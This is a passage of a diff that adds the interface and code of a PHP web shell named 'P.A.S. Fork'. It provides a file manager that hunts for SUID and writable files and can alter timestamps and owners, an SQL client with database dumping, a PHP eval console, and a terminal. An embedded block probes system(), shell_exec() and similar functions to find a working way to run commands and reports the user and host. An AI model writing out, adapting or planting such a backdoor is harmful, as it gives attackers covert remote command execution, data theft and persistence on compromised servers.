+			(COOKIE || !OI && reqFrm.method == 'get' ? window.location.href = window.location.pathname : reqFrm.submit());
+
+		reqIfrm.onload = onResp;
+	 }
+
+	 document.body.removeChild(reqFrm);	
+	 msgDiv.firstChild.onclick = cancel;
+	 setTimeout(deleteAllCookies, 100);// sorry :(
+	
+	 return false;
+}
+</script>
+
+<script id="dataExe"type="text/data"><?php $a=array('system','passthru','backticks','shell_exec','exec','popen');if(PHP_VERSION>='4.3')$a[]='proc_open';if(safemode())$a[101]='safemode';/*if(defined('EXP_EOF')){$a[7]='expect://';$a[8]='expect_popen';}*/if(!NIX&&defined('CLSCTX_ALL'))$a[10]='com';/*$s=NIX?';':'&';$c=NIX?'pwd':'cd';$w=NIX?'whoami':'echo %username%';foreach($a as$k=>$v)exe('echo '.$k.':'.$v.$s.$w.$s.'hostname'.$s.$c,$k,'',FALSE);*/foreach($a as $k => $v){if(function_exists($v)) print $k.':'.$v."\n".get_current_user()."\n".gethostname()."\n".__DIR__."\n";}?></script></head><body onkeydown="uiKeyDwn(event)"><div id="divHdr"class="divCntrls"><a href="#"class="cntrl"title="Color mode"onclick="return invertColors()">&bull;</a><a href="#"class="cntrl"title="Resize view"onclick="return uiRszBody()">&#x21C4;</a><a href="#"class="cntrl"title="Settings"onclick="return uiShwModal('divStngs')">&#x2699;</a></div><div id="divBody"><span id="tabFM"><a href="#tabFM"class="tab">File Manager</a><div class="tabPage"id="divFM"><textarea id="txtClpbrd"tabindex="-1"></textarea><form hidden id="frmUpl"><input type="file"name="f[]"id="inpUpl" onchange="uplFiles()"/></form><form class="toolbar"id="frmFM"onsubmit="return goTo(this.p.value)"><a href="#"class="cntrl"id="btnSrch"title="Search..."onclick="return uiShwFrmSrch()"></a><button type="button"title="Go home!"onclick="goTo('~')">~</button> <button title="Go!">&gt;</button> <?php if(!NIX){$a=range('A','Z');foreach($a as$v){$i=new FileInfo($v.':\\');if($i->isDir())echo'<button type="button"onclick="goTo(',"'",$v,":\\\\'",')">',$v,':</button>';}}?> <input type="text"name="p"value="<?php echo escHTML(selfPath());?>"/><span class="spnBtnSbMn"><button type="button"id="btnFastAct"title="Fast actions..."onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"><hr class="arwDwn"/></button><div class="divSbMn"onclick="onFastActClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Properties</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Delete</a></div></span>&nbsp; <span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="fmCSSend"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select id="fmCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></form><div class="subbar"><button type="button"title="You can upload multiple files at once..."onclick="elmById('inpUpl').click()">Upload &#8230;</button><span class="spnBtnSbMn"><button type="button"class="btnSbMn"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)">Create <hr class="arwDwn"/></button><div class="divSbMn"onclick="onCrtMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">File</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Link</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Directory</a></div></span><span class="spnBtnSbMn"><button type="button"class="btnSbMn"id="btnBufferMenu"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"disabled>Buffer <hr class="arwDwn"/></button><div class="divSbMn"onclick="onBufferMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Show files<a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Copy here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Move here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Clear</a></div></span></div><div><form id="frmFiles"><table id="tblFiles"cols="<?php echo NIX?8:7;?>"onclick="onTblFilesClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Files', this.checked)"/></th><th>Name</th><th width="65px">Ext</th><th width="105px">Size</th><th width="145px">Modified (UTC)</th><th width="95px">Permission</th> <?php if(NIX){?><th width="155px">Owner</th><?php }?> <th width="65px">Actions</th></tr></thead><tfoot><tr><th colspan="<?php echo NIX?8:7;?>"><button type="button"onclick="dwnFiles(getSlctdFiles())">Download</button><button type="button"onclick="prpsSlctdFiles()">Properties</button><button type="button"onclick="markSlctdFiles()">Mark</button><button type="button"onclick="delFiles(getSlctdFiles())">Delete</button></th></tr></tfoot></table></form></div><template id="tmplFilesTBody"><tbody><tr><th colspan="<?php echo NIX?8:7;?>"class="thPth"></th></tr><tr><td class="tdUp"><input type="hidden"/>&#x21b4;</td><td colspan="<?php echo NIX?7:6;?>"><a href="#"class="lnkBlck">[ .. ]</a></td></tr></tbody></template><template id="tmplFileRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkAct"></a></td><td></td><td><a href="#"class="lnkAct"></a></td><?php if(NIX){?><td></td><?php }?><td><a href="#"class="lnkAct">Mrk</a>&nbsp;<a href="#"class="lnkAct">Del</a></td></tr></template><div id="divWndws"><template id="tmplFrmFile"><form class="modal frmFile"onsubmit="saveFile(event)"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"ondblclick="return uiRsz(this.parentNode)"><span class="spnTitle">New File</span><a href="#"class="cntrl"title="Close"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz(this.parentNode.parentNode)">&#x2922;</a><a href="#"class="cntrl"title="Reload file"onclick="rldFile(event)">&#x27F3;</a></div><textarea name="t"></textarea><div class="flexRow"><input type="text"required/><select name="c"title="File encoding..."onchange="rldFileAs(event)"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select><select name="e"><option value="0">\r\n</option><option value="1"<?php if(NIX)echo' selected';?>>\n</option><option value="2">\r</option></select><button>Save</button></div></form></template><form id="frmSrch"class="modal"onmousedown="uiActvModal(event)"onsubmit="srchFiles(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Search</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmSrch')">&#x00D7;</a></div><label class="option"title="exx: <?php echo NIX?'/var/www:/etc:/tmp/':'c:\\inetpub\\wwwroot;d:\\www\\';?>">Paths<input type="text"required /></label><div class="flexRow noFlex"><div class="option"> Name (<label title="? - single char; * - zero or more char; [!0123A-Z] - class of chars (- for range, ! to exclude)"><input type="checkbox"name="w"/>wildcard</label>, <label><input type="checkbox"name="i"/>case-insensitive</label>) <input type="text"name="n"/></div><label class="option"title="Max search depth">Depth<input type="text"name="d"size="1"size="1"/></label><label class="option">Type <select name="y"onchange="uiSrchFTypeChngd()"><option value="">Any</option><option value="1">Dirs</option><option value="0">Files</option></select></label><label class="option">Mode <select name="p"><option value="">Any</option><option value="1">Readable</option><option value="2">Writable</option><option value="3">Full access</option></select></label> <?php if(NIX){?> <label class="option"> Attribute <select name="u"><option value="">Any</option><option value="1">SUID</option></select></label></div><div class="flexRow"><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Owner id<input type="text"name="o"/></label><hr class="spcr20"/><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Group id<input type="text"name="g"/></label> <?php }?> </div><div class="flexRow"><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Created (UTC)<input type="text"name="e"/></label><hr class="spcr20"/><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Modified (UTC)<input type="text"name="m"/></label></div><div class="flexRow"><label class="option"title="exx: &gt;10, &lt;102400, 10-1024, 2048">Size (bytes)<input type="text"name="z"/></label><hr class="spcr20"/><div class="option">Text (<label title="Delimiter is pound (#)"><input type="checkbox"name="x"/>use regex</label>, <label><input type="checkbox"name="v"/>case-insensitive</label>)<input type="text"name="t"/></div></div><div class="flexRow"><label><input type="checkbox"name="l"/> Process links</label><hr class="spcrFlex"/><button>Search</button></div></form><form id="frmLnk"class="modal"onmousedown="uiActvModal(event)"onsubmit="mkLnk(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Create Link</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmLnk')">&#x00D7;</a></div><label class="option">Target Path: <input type="text"name="p"required/></label><label class="option">Link Path: <input type="text"required/></label><div class="flexRow"><select name="t"><option value="0">Symbolic</option><option value="1">Hard</option></select><hr class="spcrFlex"/><button>Create</button></div></form><template id="tmplFrmPrps"><form class="modal frmFilesPrps"onmousedown="uiActvModal(event)"onsubmit="chngPrps(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Properties</span><a href="#"class="cntrl"title="Close without saving"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a></div><label class="option">Path<input type="text"name="p"request/></label><div class="flexRow"><label class="option">Modified (UTC) <a href="#"class="cntrl arwDwn"onclick="setErlDate(event)"title="Set the earliest date from table"></a><input type="text"size="1"name="t"/></label> <?php if(NIX){?> <hr class="spcr20"/><label class="option">Permission<input type="text"size="1"name="e"/></label><hr class="spcr20"/><label class="option">Owner<input type="text"size="1"name="o"/></label><hr class="spcr20"/><label class="option">Group<input type="text"size="1"name="r"/></label></div><div class="flexRow"> <?php }?> <hr class="spcrFlex"/><button >Save</button></div></form></template><form id="frmBuffer"class="modal"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Buffer</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmBuffer')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('frmBuffer')">&#x2922;</a></div><table id="tblBuffer"onclick="onTblBufferClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Buffer', this.checked)"/></th><th>File</th><th width="35px">Act</th></tr></thead><tfoot><tr><th colspan="3"><button type="button"onclick="unmarkFiles()">Remove</button></th></tr></tfoot></table><template id="tmplBufferRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"></a></td><td><a href="#"class="lnkAct">Rm</a></td></tr></template></form></div></div></span><span id="tabSQL"><a href="#tabSQL"class="tab">SQL Client</a><div class="tabPage"id="divPageSQL"><form class="toolbar"id="frmCnnct"onsubmit="return cnnct()"><select name="e"> <?php $a=array('MYSQL_NUM'=>array('MySQL','MySQL'),'MYSQLI_NUM'=>array('MySQLi','MySQLi'),'PDO::MYSQL_ATTR_INIT_COMMAND'=>array('MySQLPDO','MySQL (PDO)'),'MSSQL_NUM'=>array('MSSQL','MSSQL'),'SQLSRV_ERR_ALL'=>array('SQLSrv','MSSQL (SQLSrv)'),'PDO::PARAM_INT'=>array('MSSQLDBLIB','MSSQL (PDO_DBLIB)'),'PDO::PARAM_STR'=>array('MSSQLODBC','MSSQL (PDO_ODBC)'),'PDO::SQLSRV_ENCODING_UTF8'=>array('SQLSrvPDO','MSSQL (PDO_SQLSRV)'),'PGSQL_NUM'=>array('PGSQL','PostgreSQL'),'PDO::PARAM_LOB'=>array('PGSQLPDO','PostgreSQL (PDO)'));foreach($a as$k=>$v)if(defined($k))echo'<option value="',$v[0],'">',$v[1],'</option>';?> </select><input type="text"name="h"placeholder="Host"/><input type="text"name="u"placeholder="User"/><input type="text"name="p"placeholder="Password"/><input type="text"name="b"placeholder="Base"/><button>&gt;</button></form><div class="subbar"><span class="spnChrst"> <hr class="arwUp"/> <select id="sqlCSSend"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><span class="spnChrst"><hr class="arwDwn"/> <select id="sqlCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?> </select></span></div><div id="divSQL"><div id="divSQLWrpLeft"><div class="panel"><label><input type="checkbox"id="cbCR"/> Count number of rows</label></div><div class="panel"><div id="divSchm"></div></div><div class="panel"id="divDump">Dump as <select id="slctDmpFrmt"><option value="0">SQL</option><option value="1">CSV</option></select><button type="button"onclick="dump()">&gt;</button></div></div><div id="divSQLWrpRight"><form class="panel flexRow"id="frmSQL"onsubmit="return query()"><input type="text"name="q"placeholder="SQL query"/><button>&gt;</button></form><div id="divCptn"></div><div id="divData"><table id="tblHead"></table><table id="tblData"></table></div><form class="panel"id="frmPg"onsubmit="return chngPg(0)"><input type="hidden"name="b"/><input type="hidden"name="s"/><input type="hidden"name="t"/> Start from row <button type="button"onclick="chngPg(-1)">&lt;</button><input type="text"name="o"size="5"value="0"/><button type="button"onclick="chngPg(1)">&gt;</button><div style="float:right">Rows per page <input type="text"name="r"size="3"value="25"/><button>&gt;</button></div></form></div></div></div></span><span id="tabPHP"><a href="#tabPHP"class="tab">PHP Console</a><div class="tabPage"id="divPagePHP"><form class="toolbar"id="frmPHP"onsubmit="return evl()"><label><a href="#"title="Change composition"class="cmpsRow"id="aCmps"onclick="return uiChngCmps()">Composition</a></label><label title="Erase PHP code after successful eval"><input type="checkbox"id="cbClnInp"/> Clear input</label><label title="Erase previous results before show new"><input type="checkbox"id="cbClnOut" checked/> Clear output</label><label title="Render result as HTML"><input type="checkbox"id="cbHTML"/> Show as HTML</label><label><input type="checkbox"name="h"/> Hide PHP errors</label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctPHPCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><button id="sbmPHP"title="Press Ctrl + Enter to evaluate code">Eval</button></div></form><div id="divPHP"><textarea name="e"form="frmPHP"id="txtPHP"placeholder="phpinfo();"onkeydown="onPHPKeyDwn(event)"></textarea><pre id="prePHP"onkeydown="onPHPResKeyDwn(event)"tabindex="-1"></pre></div></div></span><span id="tabTrm"><a href="#tabTrm"class="tab">Terminal</a><form class="tabPage"id="frmTrm"onsubmit="return exec()"><div class="toolbar"><label class="flexRow"title="Shell must be able to accept command from the argument 'c' (e.g.: $<?php echo NIX?"/bin/shell -c 'uname -a; id'":"cmd /c 'ver; pwd'";?>)">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label><input type="checkbox"name="h"> Don't show errors</label><label><input type="checkbox" id="cbIT"/> Invert output</label><label>Use function: <select name="f"></select></label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctTrmCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"style="text-align:right"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></div></div><div id="divTrm"onclick="onTrmClick(event)"><pre id="preTrm"onkeydown="onTrmResKeyDwn(event)"tabindex="-1"></pre><div class="flexRow"><span id="spnUsrHst"></span>:<span id="spnPth"></span>$&nbsp;<input type="text"name="e"id="inpTrm"onkeydown="onTrmInpKeyDwn(event)"autocomplete="off"/></div></div></form></span><span id="tabInf"><a href="#tabInf"class="tab">Information</a><div class="tabPage"id="divInfo"><div class="toolbar"><div><a href="#"class="lnkAct"onclick="return ajxSnd('Get main info', onInfMain, null, {a:'i',t:'m'})">Main</a> / <a href="#"class="lnkAct"onclick="return ajxSnd('Get php info', onInfPHP, null, {a:'i',t:'p'})">PHP</a> / </div></div> <?php infMain(TRUE);?></div></span></div><div class="panel"id="divFtr"><div><a href="https://github.com/cr1f/P.A.S.-Fork/"target="blank">P.A.S. Fork v. <?php echo VER;?></a></div><div id="divDtTm"title="Server Time"><span></span></div><div><a href="#"id="actLog"title="Message log"onclick="return uiShwModal('divLog')">&#x26A0;</a></div></div><div class="modal"onmousedown="uiActvModal(event)"id="divStngs"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Settings</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divStngs')">&#x00D7;</a></div>	<label class="option"><input onclick="COOKIE = (this.checked ? 1 : 0)" type="checkbox" id="cbCO"/> Use cookie to request</label>	<label class="option"><input type="checkbox" id="cbRR"/> Skip request encoding</label><label title="Raw Output mode for big files.&#10;Skip response encoding ('ob_*')." class="option"><input type="checkbox" id="cbRO"/> Skip response encoding</label><label title="Shown in File Manager" class="option"><input type="checkbox" id="cbTM"/> <b>ctime</b> instead of <b>mtime</b></label><label class="option"><input type="checkbox" id="cbOI"/> <b>iframe</b> instead of <b>xhr</b></label><form id="frmCstEnv"onsubmit="return false"><fieldset id="fldEnv"><legend><label><input type="checkbox"id="e"/> Run in custom environment</label></legend><label>Function: <select name="f"></select></label><label class="option">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label class="option">Interpreter: <input type="text"name="i"value="<?php if(PHP_VERSION>='5.4')echo escHTML(PHP_BINARY);?>"/></label><label class="option"><input type="checkbox"name="n"/> -n &nbsp;No php.ini file will be used</label><label class="option"><input type="checkbox"name="c"/> -C &nbsp;Do not chdir to the script's directory</label></fieldset></form></div><div class="modal"onmousedown="uiActvModal(event)"id="divLog"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Message Log</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divLog')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('divLog')">&#x2922;</a><a href="#"class="cntrl"title="Clear"onclick="return clnLog()">&#8802;</a></div><div id="divLogCntn"></div></div><div id="divMsgs"class="divCntrls"></div></body>
+<?=paramsHandlerJS()?>
+<script>
+<?php if($GLOBALS['ACECONF']['URL']){ ?>
+function aceEditorProcess(element = false){
+
+	if(typeof ace == 'undefined'){
+		var aceScript = document.createElement('script');
+		aceScript.src = '<?=$GLOBALS['ACECONF']['URL']?>';
+		document.body.appendChild(aceScript);
+		
+		aceScript.onload = function(){
+			aceEditor = [];
+			aceEditorModes = ['php', 'perl', 'python', 'golang', 'ruby', 'javascript', 'sh', 'powershell' , 'sql', 'apache_conf', 'nginx', 'lua', 'markdown'];
+			aceEditorThemes = ['eclipse', 'dreamweaver', 'crimson_editor', 'sqlserver', 'solarized_light', 'xcode', 'katzenmilch', 'dawn', 'iplastic', 'monokai', 'ambiance', 'cobalt', 'nord_dark'];
+			if(element) aceFileEditor(element);
+			acePHPEditor();
+		}
+		
+		return false;
+	}
+	
+	aceFileEditor(element);
+}
+
+function aceFileEditor(element){
+	var parentForm = getParentFormOf(element);
+	var eId = parentForm.name = (parentForm.name ? parentForm.name : Math.random().toString(36).substring(2, 15));
+	var flexRow = parentForm.children[2];
+	var textArea = parentForm.elements[0];
+	var saveButton = parentForm.elements[4];
+	var reloadButton = parentForm.children[0].children[3];
+	var editorButton = parentForm.children[0].children[4];
+	var closeButton = parentForm.children[0].children[1];
+	var aceEditorDiv = parentForm.children[eId];
+	var aceEditorModeSelect = flexRow.children[1];
+	var aceEditorThemeSelect = flexRow.children[2];
+
+	if(aceEditorDiv){
+		parentForm.removeChild(aceEditorDiv);
+		flexRow.removeChild(aceEditorModeSelect);
+		flexRow.removeChild(aceEditorThemeSelect);
+		textArea.value = aceEditor[eId].getValue();
+		textArea.style.display = 'inline';
+		saveButton.setAttribute('onclick', '');
+		reloadButton.setAttribute('oncontextmenu', '');
+		reloadButton.setAttribute('title', '');
+		closeButton.setAttribute('onclick', 'return uiDstrModal(this.parentNode.parentNode)');
+		clearInterval(aceEditor[eId]['setInterval']);
+		delete aceEditor[eId];
+		
+		return false;
+	}
+	
+	var wrapLines = 'aceEditor["' + eId + '"].setOption("wrap", (aceEditor["' + eId + '"].getOption("wrap") == "free" ? "off" : "free")); return false;';
+	var clickNscroll = 'aceEditor["' + eId + '"]["reloadButton"].click(); setTimeout("aceEditor[`' + eId + '`].scrollToRow(Number.MAX_SAFE_INTEGER)", 200);';
+	
+	var hotKeys = `
+		if(event.ctrlKey){
+			if(event.keyCode === 83){
+				getParentFormOf(this).elements[6].click(); return false;
+			}
+			if(event.keyCode === 69){
+				` + wrapLines + `
+				return false;
+			}
+		}
+	`;
+	var hotKeysHint = `Ctrl + [KEY]:\n\nS - Save\nE - Line wrap\nL - Go to line\nP - Go to bracket\nH - Find and Replace\n\nSee the AceJS wiki for more.`;
+
+	var aceEditorDiv = document.createElement('div');
+	aceEditorDiv.id = eId;
+	aceEditorDiv.contentEditable = 'true';
+	aceEditorDiv.style = 'border: 1px solid #7f7f7f; height: 100%; margin: 2px;';
+	aceEditorDiv.textContent = textArea.value;
+	aceEditorDiv.setAttribute('onkeydown', hotKeys);
+	parentForm.insertBefore(aceEditorDiv, parentForm.children[3]);
+	parentForm.setAttribute('onmousedown', 'if(event.srcElement.className != "ace_content") uiActvModal(event)');
+	saveButton.setAttribute('onclick', 'getParentFormOf(this).elements[0].value = aceEditor[\'' + eId + '\'].getValue()');
+	reloadButton.setAttribute('oncontextmenu', `
+		var e = aceEditor['` + eId + `'];
+		var p = prompt((e['reloadInterval'] ? 'Current value is ' + e['reloadInterval'] + '. ' : '') + 'Set reload interval in seconds: \\n\\n');
+		var s = Math.abs(Number(p));
+
+		clearInterval(e['setInterval']);
+		
+		if(s > 0){
+			e['reloadInterval'] = s;
+			e['setInterval'] = setInterval('` + clickNscroll + `', s * 1000);
+			this.title = s + ' sec.';
+			this.style.color = 'red';
+		}
+		else if(e['reloadInterval']){
+			this.style.color = this.title = '';
+			clearInterval(e['setInterval']);
+			delete e['reloadInterval'];
+		}
+		else if(p == null){
+			` + clickNscroll + `
+		}
+
+		return false;
+	`);
+	editorButton.title = hotKeysHint;
+	closeButton.setAttribute('onclick', 'clearInterval(aceEditor[\'' + eId +'\'][\'setInterval\']); delete aceEditor[\'' + eId + '\'];' + closeButton.getAttribute('onclick'));
+
+	textArea.style.display = 'none';
+	
+	if(!textArea.setterRedefined) redefineSetter(textArea, eId);
+
+	aceEditor[eId] = ace.edit(eId);
+	aceEditor[eId].reloadButton = reloadButton;
+	setEditorOptions(aceEditor[eId]);
+	
+	new ResizeObserver((function(){if(aceEditor[eId]) aceEditor[eId].resize()})).observe(parentForm);
+
+	aceEditorThemeSelect = buildSelectFor(aceEditorThemes, '<?=$GLOBALS['ACECONF']['THEME']?>', 'aceEditor[\'' + eId + '\'].setTheme(\'ace/theme/\' + this.value);');
+	aceEditorModeSelect = buildSelectFor(aceEditorModes, '<?=$GLOBALS['ACECONF']['MODE']?>', 'aceEditor[\'' + eId + '\'].session.setMode(\'ace/mode/\' + this.value);');
+	aceEditorModeSelect.setAttribute('oncontextmenu', wrapLines);
+	aceEditorModeSelect.title = 'Right click to change line wrap';
+	
+	flexRow.insertBefore(aceEditorModeSelect, flexRow.children[1]);
+    flexRow.insertBefore(aceEditorThemeSelect, flexRow.children[1]);
+}
+
+function acePHPEditor(){
+	var frmPHP = document.getElementById('frmPHP');
+	var divPHP = document.getElementById('divPHP');
+	var acePHPDiv = document.createElement('div');
+	var evalButton = document.getElementById('sbmPHP');
+	var textArea = document.getElementById('txtPHP');
+	
+	acePHPDiv.textContent = '\x3c?php\n\nphpinfo();';
+	acePHPDiv.style = 'border: 1px solid #C7C7C7; margin: 2px;flex: 1;';
+	textArea.style.display = 'none';
+	redefineSetter(textArea, 'acePHPDiv');
+	divPHP.insertBefore(acePHPDiv, divPHP.children[1]);
+	evalButton.setAttribute('onclick', 'divPHP.children[0].value = aceEditor[\'acePHPDiv\'].getValue();');
+	aceEditor['acePHPDiv'] = ace.edit(acePHPDiv);
+	setEditorOptions(aceEditor['acePHPDiv']);
+	aceEditor['acePHPDiv'].session.setMode('ace/mode/php');
+	frmPHP.insertBefore(buildSelectFor(aceEditorThemes, '<?=$GLOBALS['ACECONF']['THEME']?>', 'aceEditor[\'acePHPDiv\'].setTheme(\'ace/theme/\' + this.value);'), frmPHP.children[1]);
+}
+
+
+function setEditorOptions(e){
+	e.setFontSize('14px');
+	e.setTheme('ace/theme/<?=$GLOBALS['ACECONF']['THEME']?>');
+	e.session.setMode('ace/mode/<?=$GLOBALS['ACECONF']['MODE']?>');
+	e.setOption('showPrintMargin', false);
+	e.setOption('wrap', true);
+	e.session.setUseWorker(false);
+	e.setBehavioursEnabled(true);
+}
+
+function redefineSetter(textArea, eId){
+    Object.defineProperty(textArea, 'value', {
+		set(value){
+			this.setterRedefined = true;
+			if(aceEditor[eId])
+				aceEditor[eId].setValue(value, -1);
+			return Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(this, value);
+		},
+		get(){
+			return Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').get.call(this);
+		}
+    });
+}
+
+function buildSelectFor(array, selected = '', onChange = ''){
+	var select = document.createElement('select');
+	select.setAttribute('onchange', onChange);
+	array.forEach(function(item){
+		var option = document.createElement('option');
+		option.value = option.textContent = item;
+		if(item == selected) option.selected = true;
+		select.appendChild(option);
+	});
+	
+	return select;
+}
+
+function insertCodeEditor(){
+	document.getElementById('tmplFrmFile').innerHTML = document.getElementById('tmplFrmFile').innerHTML.replace(/<\/a><\/div>/g,'</a> <a href="#" class="cntrl" title="Code Editor&#x000a;&#x000a;After clicking, the EXTERNAL JS file will be loaded:&#x000a;&#x000a;<?=$GLOBALS['ACECONF']['URL']?>" onclick="aceEditorProcess(this);return false"><small>E</small></a><?=($GLOBALS['ACECONF']['DEFAULT'] ? '<img/src/onerror="aceFileEditor(this);"/style="display:none;"/>' : '')?></div>');
+}
+
+insertCodeEditor();
+<?php } ?>
+
+function addSortToFM(){
+	var fmTblCols = document.getElementById('tblFiles').children[0].children[0].children;
+	
+	for(i = 0; i <= fmTblCols.length; i++){
+		if(fmTblCols[i] && fmTblCols[i].textContent){
+			var name = fmTblCols[i].textContent.toLowerCase();
+			fmTblCols[i].style = fmTblCols[i].style + '; cursor: pointer;';
+			fmTblCols[i].title = 'Sort files by ' + name;
+			fmTblCols[i].setAttribute('onclick', 'sortFilesBy("' + name + '");');
+		}
+	}
+}
+
+function sortFilesBy(name){
+	var sorts = {'nam': '1','ext': '2','siz': '11','mod': '12','per': '14','own': '15'};
+	var sort = sorts[name.substr(0, 3)];
+	if(sort){
+		fmSort = [(sort == fmSort[1] && fmSort[0] != -1 ? -1 : 1), sort];
+		goTo(document.getElementById('frmFM').p.value);
+	}
+}
+
+addSortToFM();
+
+window.location = '#<?=$GLOBALS['DEFAULT_TAB']?>';
+window.addEventListener('load',function(){
+	<?=($GLOBALS['DEFAULT_TAB'] == 'tabFM' ? 'goTo("~");' : '')?>
+	<?=($GLOBALS['ACECONF']['DEFAULT'] ? 'aceEditorProcess();' : '')?>
+});
+</script>
+</html>
+<?php $out = ob_get_contents(); ob_end_clean(); ob_start('ob_gzhandler'); exit(makeOut($out));
